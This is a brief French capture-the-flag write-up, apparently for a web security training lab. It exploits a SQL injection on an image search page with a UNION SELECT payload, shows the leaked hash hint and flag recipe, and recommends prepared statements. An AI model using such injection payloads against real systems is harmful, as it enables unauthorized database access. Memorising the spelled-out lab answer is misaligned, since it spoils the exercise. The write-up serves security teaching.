# SQL Injection images

## Trouver la faille
Sur la page http://192.168.0.32/?page=searchimg

On utilise la meme chose que pour les memebers, on trouve le nom de la table et les colonnes necessaire

```bash
0 or 1 UNION select url, comment from list_images

result:
ID: 0 or 1 UNION select url, comment from list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : borntosec.ddns.net/images.png
```

On décrypt avec md5 et on crypte avec Sh256 on aura le flag

## Comment utiliser cette faille
c'est un accée a toute la bdd

## Solution
Il faut utiliser des requetes SQL prepared telsque PDO
